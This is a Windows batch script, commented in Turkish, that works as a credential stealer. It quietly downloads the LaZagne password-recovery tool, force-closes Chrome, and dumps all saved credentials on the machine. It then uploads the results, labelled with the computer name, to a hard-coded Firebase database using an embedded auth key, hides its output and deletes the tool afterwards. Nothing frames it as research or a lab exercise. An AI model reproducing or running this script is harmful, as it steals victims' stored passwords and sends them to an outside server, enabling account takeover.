@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: Ayarlar
set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"

:: 1. LaZagne indir
if not exist "%LAZAGNE_EXE%" (
    powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'" >nul 2>&1
    if not exist "%LAZAGNE_EXE%" exit /b
)

:: 2. Chrome'u kapat
tasklist /FI "IMAGENAME eq chrome.exe" | find /I "chrome.exe" >nul
if %errorlevel% == 0 (
    taskkill /IM chrome.exe /F >nul 2>&1
)

:: 3. Output klasörü oluştur
if not exist "%OUTPUT_DIR%" (
    mkdir "%OUTPUT_DIR%" >nul 2>&1
    if errorlevel 1 exit /b
)

:: 4. Credential'ları topla
"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1
if errorlevel 1 exit /b

:: Son oluşturulan dosyayı bul
set "RESULT_FILE="
for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"
if not defined RESULT_FILE exit /b

:: 5. Firebase'e yükle
set "PC_NAME=%COMPUTERNAME%"
set "PC_NAME=!PC_NAME: =_!"
set "PC_NAME=!PC_NAME:-=_!"

powershell -WindowStyle Hidden -Command ^
"$content=Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%';" ^
"$json=@{'computer'='%PC_NAME%';'timestamp'='%DATE% %TIME%';'data'=$content} | ConvertTo-Json -Compress;" ^
"Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json'" >nul 2>&1

:: Temizlik
del /q "%LAZAGNE_EXE%" >nul 2>&1
exit /b 0
